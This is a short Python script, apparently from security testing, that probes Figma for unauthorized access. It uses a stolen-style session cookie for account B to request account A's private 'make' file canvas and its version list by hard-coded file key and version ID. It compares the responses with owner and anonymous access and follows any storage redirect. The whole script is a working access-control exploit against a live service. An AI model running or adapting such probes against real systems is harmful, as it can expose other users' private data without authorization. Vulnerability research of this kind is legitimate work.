# -*- coding: utf-8 -*-
"""B(无权限) 下载 A 私有 make 文件 .fig: 越权对照
A_MAKE=5zb5YkoxMa09KpqOyuLcHD (私有), vid=2389248204276733251 (最新版本)
对比: 匿名 404 / A owner 200 / B 无权限 ?
"""
import io, json, sys, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
VID = "2389248204276733251"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
AC = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

def call(label, cookie=None):
    headers = {"User-Agent": UA, "Accept": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    url = f"{BASE}/version/{VID}/canvas?fk={A_MAKE}&fv=0"
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            raw = r.read()
            loc = r.headers.get("Location")
            print(f"[{label}] HTTP {r.status} len={len(raw)} type={r.headers.get('Content-Type')} loc={str(loc)[:120]}")
            if loc and loc.startswith('http'):
                call_s3(f"[{label}] s3", loc, cookie)
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} :: {raw[:150]}")

def call_s3(label, url, cookie=None):
    headers = {"User-Agent": UA}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            raw = r.read()
            print(f"[{label}] HTTP {r.status} len={len(raw)} type={r.headers.get('Content-Type')}")
    except urllib.error.HTTPError as e:
        print(f"[{label}] HTTP {e.code}")

print("===== B 下载 A 私有 make 文件 .fig (核心对照) =====")
call("B canvas", cookie=BC)

print("\n===== B versions: A 私有 make 文件 (能否拿 vid) =====")
s, raw = None, None
try:
    req = urllib.request.Request(f"{BASE}/api/versions/{A_MAKE}?page_size=10",
                                 headers={"User-Agent": UA, "Accept": "application/json",
                                          "Cookie": BC})
    with urllib.request.urlopen(req, timeout=30) as r:
        raw = r.read().decode(errors='replace')
        print(f"[B versions A_MAKE] HTTP {r.status} :: {raw[:200]}")
except urllib.error.HTTPError as e:
    raw = e.read().decode(errors='replace')
    print(f"[B versions A_MAKE] HTTP {e.code} :: {raw[:200]}")

print("\n===== A 对照: versions (owner) =====")
try:
    req = urllib.request.Request(f"{BASE}/api/versions/{A_MAKE}?page_size=10",
                                 headers={"User-Agent": UA, "Accept": "application/json",
                                          "Cookie": AC})
    with urllib.request.urlopen(req, timeout=30) as r:
        raw = r.read().decode(errors='replace')
        print(f"[A versions A_MAKE] HTTP {r.status} :: {raw[:150]}")
except urllib.error.HTTPError as e:
    print(f"[A versions A_MAKE] HTTP {e.code} :: {e.read().decode(errors='replace')[:150]}")
